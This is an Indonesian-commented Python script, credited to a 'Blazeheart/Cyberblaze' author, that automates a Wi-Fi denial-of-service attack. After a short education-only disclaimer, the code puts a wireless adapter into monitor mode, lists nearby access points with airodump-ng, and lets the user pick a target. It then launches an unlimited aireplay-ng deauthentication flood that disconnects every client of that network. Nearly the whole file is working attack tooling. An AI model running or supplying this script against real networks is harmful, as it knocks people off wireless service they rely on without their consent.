#!/usr/bin/env python3
# Disclaimer: Script ini hanya untuk tujuan pendidikan. Jangan gunakan terhadap jaringan yang tidak Anda miliki atau tidak memiliki izin untuk menguji.

# Modul yang digunakan
import subprocess
import re
import csv
import os
import time
import shutil
from datetime import datetime

# Daftar jaringan nirkabel aktif
active_wireless_networks = []

# Fungsi untuk memeriksa apakah ESSID sudah ada dalam daftar
def check_for_essid(essid, lst):
    check_status = True

    # Jika tidak ada ESSID dalam daftar, tambahkan
    if len(lst) == 0:
        return check_status

    # Jika sudah ada, jangan tambahkan lagi
    for item in lst:
        if essid in item["ESSID"]:
            check_status = False

    return check_status

# Header antarmuka pengguna
print(r"""
 ▄▄▄▄   ██▓   ▄▄▄     ▒███████▓█████ ██░ ██▓█████▄▄▄      ██▀███ ▄▄▄█████▓
▓█████▄▓██▒  ▒████▄   ▒ ▒ ▒ ▄▀▓█   ▀▓██░ ██▓█   ▒████▄   ▓██ ▒ ██▓  ██▒ ▓▒
▒██▒ ▄█▒██░  ▒██  ▀█▄ ░ ▒ ▄▀▒░▒███  ▒██▀▀██▒███ ▒██  ▀█▄ ▓██ ░▄█ ▒ ▓██░ ▒░
▒██░█▀ ▒██░  ░██▄▄▄▄██  ▄▀▒   ▒▓█  ▄░▓█ ░██▒▓█  ░██▄▄▄▄██▒██▀▀█▄ ░ ▓██▓ ░ 
░▓█  ▀█░██████▓█   ▓██▒███████░▒████░▓█▒░██░▒████▓█   ▓██░██▓ ▒██▒ ▒██▒ ░ 
░▒▓███▀░ ▒░▓  ▒▒   ▓▒█░▒▒ ▓░▒░░░ ▒░ ░▒ ░░▒░░░ ▒░ ▒▒   ▓▒█░ ▒▓ ░▒▓░ ▒ ░░   
▒░▒   ░░ ░ ░   ░   ▒  ░ ░ ░ ░ ░  ░   ░  ░░ ░  ░   ░   ▒    ░░   ░  ░      
 ░    ░  ░ ░   ░    ░  ░ ░ ░ ░  ░   ░░  ░  ░  ░  ░    ░  ░  ░              ░               
""")
print("\n***************************************************************************")
print("\n* Copyright of Blazeheart, 2024                                          *")
print("\n* https://github.com/Cyberblaze-id                                       *")
print("\n* https://www.instagram.com/cyberblaze.id                                *")
print("\n* https://www.youtube.com/@cyberblaze-id                                 *")
print("\n***************************************************************************")

# Cek apakah user menjalankan script dengan hak akses superuser (sudo)
if not 'SUDO_UID' in os.environ.keys():
    print("Coba jalankan program ini dengan sudo.")
    exit()

# Menghapus file .csv sebelum menjalankan script
for file_name in os.listdir():
    if ".csv" in file_name:
        print("Ada file .csv yang ditemukan di direktori, akan dipindahkan ke folder backup.")
        directory = os.getcwd()
        try:
            os.mkdir(directory + "/backup/")
        except:
            print("Folder backup sudah ada.")
        timestamp = datetime.now()
        shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)

# Regex untuk mencari interface nirkabel
wlan_pattern = re.compile("^wlan[0-9]+")

# Cek interface Wi-Fi yang tersedia
check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

# Jika tidak ada adapter Wi-Fi yang terhubung
if len(check_wifi_result) == 0:
    print("Silakan sambungkan adapter Wi-Fi dan coba lagi.")
    exit()

# Menampilkan pilihan interface Wi-Fi
print("Interface Wi-Fi yang tersedia:")
for index, item in enumerate(check_wifi_result):
    print(f"{index} - {item}")

# Memilih interface Wi-Fi untuk digunakan
while True:
    wifi_interface_choice = input("Pilih interface yang ingin digunakan untuk serangan: ")
    try:
        if check_wifi_result[int(wifi_interface_choice)]:
            break
    except:
        print("Masukkan nomor yang sesuai dengan pilihan yang tersedia.")

hacknic = check_wifi_result[int(wifi_interface_choice)]

# Menghentikan proses yang mengganggu
print("WiFi adapter terhubung! Sekarang kita akan menghentikan proses yang mengganggu:")

# Menempatkan adapter Wi-Fi ke mode monitor
print("Memasukkan Wi-Fi adapter ke mode monitor:")
subprocess.run(["ip", "link", "set", hacknic, "down"])
subprocess.run(["airmon-ng", "check", "kill"])
subprocess.run(["iw", hacknic, "set", "monitor", "none"])
subprocess.run(["ip", "link", "set", hacknic, "up"])

# Mencari akses point
discover_access_points = subprocess.Popen(["sudo", "airodump-ng", "-w", "file", "--write-interval", "1", "--output-format", "csv", hacknic], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# Loop untuk menampilkan jaringan nirkabel yang terdeteksi
try:
    while True:
        subprocess.call("clear", shell=True)
        for file_name in os.listdir():
            fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
            if ".csv" in file_name:
                with open(file_name) as csv_h:
                    csv_h.seek(0)
                    csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                    for row in csv_reader:
                        if row["BSSID"] == "BSSID":
                            pass
                        elif row["BSSID"] == "Station MAC":
                            break
                        elif check_for_essid(row["ESSID"], active_wireless_networks):
                            active_wireless_networks.append(row)

        print("Pemindaian. Tekan Ctrl+C untuk memilih jaringan nirkabel yang ingin diserang.\n")
        print("No |\tBSSID              |\tChannel|\tESSID                         |")
        print("___|\t___________________|\t_______|\t______________________________|")
        for index, item in enumerate(active_wireless_networks):
            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
        time.sleep(1)

except KeyboardInterrupt:
    print("\nSiap untuk memilih jaringan.")

# Memastikan input yang valid
while True:
    choice = input("Pilih salah satu pilihan di atas: ")
    try:
        if active_wireless_networks[int(choice)]:
            break
    except:
        print("Silakan coba lagi.")

# Menentukan BSSID dan channel untuk serangan
hackbssid = active_wireless_networks[int(choice)]["BSSID"]
hackchannel = active_wireless_networks[int(choice)]["channel"].strip()

# Menyeting channel untuk melakukan serangan
subprocess.run(["airmon-ng", "start", hacknic, hackchannel])

# Melakukan serangan deauthentication
try:
    subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, hacknic])
except KeyboardInterrupt:
    print("Selesai!")
    
# Tekan Ctrl+C untuk selesai